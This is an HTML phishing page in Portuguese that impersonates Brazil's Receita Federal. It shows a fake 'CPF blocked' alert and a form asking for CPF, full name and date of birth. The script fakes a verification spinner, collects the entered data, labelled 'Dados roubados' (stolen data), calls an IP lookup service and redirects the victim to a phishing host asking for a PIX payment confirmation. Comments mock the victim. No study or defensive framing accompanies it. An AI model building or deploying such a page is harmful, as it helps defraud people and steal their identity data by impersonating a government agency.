<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Consulta de Regularidade Fiscal - Receita Federal</title>
    <style>
        :root {
            --azul-oficial: #004a8d;
            --vermelho-alerta: #d32f2f;
            --cinza-fundo: #f8f9fa;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', system-ui, sans-serif;
        }

        body {
            background: var(--cinza-fundo);
            min-height: 100vh;
        }

        .header-rfb {
            background: var(--azul-oficial);
            padding: 1rem;
            border-bottom: 4px solid #002b5c;
        }

        .nav-oficial {
            background: #002b5c;
            padding: 0.8rem;
            display: flex;
            gap: 2rem;
            justify-content: center;
        }

        .nav-link {
            color: white !important;
            text-decoration: none;
            font-size: 0.9rem;
        }

        .container {
            max-width: 800px;
            margin: 2rem auto;
            background: white;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            overflow: hidden;
        }

        .alert-status {
            background: var(--vermelho-alerta);
            color: white;
            padding: 1.5rem;
            display: flex;
            align-items: center;
            gap: 1rem;
        }

        .alert-icon {
            font-size: 2rem;
        }

        .form-section {
            padding: 2rem;
        }

        .form-group {
            margin-bottom: 1.5rem;
        }

        label {
            display: block;
            margin-bottom: 0.5rem;
            color: #333;
            font-weight: 600;
        }

        .input-rfb {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 1rem;
            transition: all 0.3s;
        }

        .input-rfb:focus {
            border-color: var(--azul-oficial);
            box-shadow: 0 0 0 3px rgba(0,74,141,0.1);
        }

        .btn-validar {
            background: linear-gradient(180deg, #004a8d 0%, #003366 100%);
            color: white;
            padding: 1rem 2rem;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 1.1rem;
            width: 100%;
            transition: transform 0.2s;
        }

        .btn-validar:hover {
            transform: translateY(-2px);
        }

        .loading {
            display: none;
            text-align: center;
            padding: 1rem;
        }

        .spinner {
            border: 4px solid rgba(0,0,0,0.1);
            border-left-color: var(--azul-oficial);
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .security-footer {
            background: #f1f1f1;
            padding: 1.5rem;
            text-align: center;
            font-size: 0.8rem;
            color: #666;
        }

        @media (max-width: 768px) {
            .container {
                margin: 1rem;
            }

            .nav-oficial {
                flex-wrap: wrap;
                gap: 1rem;
                padding: 0.5rem;
            }

            .alert-status {
                flex-direction: column;
                text-align: center;
            }
        }
    </style>
</head>
<body>
    <header class="header-rfb">
        <img src="logo-receita-fake.png" alt="Receita Federal" style="width: 320px; display: block; margin: 0 auto;">
    </header>

    <nav class="nav-oficial">
        <a href="#" class="nav-link">Acesso à Informação</a>
        <a href="#" class="nav-link">Serviços</a>
        <a href="#" class="nav-link">Legislação</a>
        <a href="#" class="nav-link">Ajuda</a>
    </nav>

    <div class="container">
        <div class="alert-status">
            <div class="alert-icon">⚠️</div>
            <div>
                <h2>CPF BLOQUEADO TEMPORARIAMENTE</h2>
                <p>Identificamos irregularidades no processo de estorno. Valide seus dados para regularização imediata.</p>
            </div>
        </div>

        <form class="form-section" id="formGolpe">
            <div class="form-group">
                <label>CPF</label>
                <input type="text" class="input-rfb" placeholder="000.000.000-00" pattern="\d{3}\.\d{3}\.\d{3}-\d{2}" required>
            </div>

            <div class="form-group">
                <label>Nome Completo</label>
                <input type="text" class="input-rfb" placeholder="Como consta na Receita Federal" required>
            </div>

            <div class="form-group">
                <label>Data de Nascimento</label>
                <input type="date" class="input-rfb" required>
            </div>

            <button type="submit" class="btn-validar">
                VALIDAR DADOS PARA DESBLOQUEIO
            </button>
        </form>

        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p style="margin-top: 1rem;">Consultando base de dados da RFB...</p>
        </div>
    </div>

    <div class="security-footer">
        <div style="margin-bottom: 1rem;">
            <img src="ssl-fake.png" alt="SSL" style="height: 30px; margin: 0 5px;">
            <img src="selo-gov-fake.png" alt="Gov.br" style="height: 30px; margin: 0 5px;">
        </div>
        © 2024 Receita Federal do Brasil - Todos os direitos reservados
    </div>

    <script>
        document.getElementById('formGolpe').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Mostra loading fake
            document.getElementById('loading').style.display = 'block';
            document.getElementById('formGolpe').style.display = 'none';

            // Simula verificação "profissional"
            setTimeout(() => {
                // Coleta dados do otário
                const cpf = document.querySelector('input[type="text"]').value;
                const nome = document.querySelectorAll('input[type="text"]')[1].value;
                
                // Log fake no console
                console.log(`Dados roubados: ${cpf} | ${nome} | IP: ${fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip)}`);

                // Redireciona para página de phishing final
                window.location.href = 'https://phishing-final.receitafake[.site]/confirme-seu-pix';
            }, 3000);
        });

        // Atualiza data automaticamente
        document.querySelector('input[type="date"]').valueAsDate = new Date();
    </script>
</body>
</html>
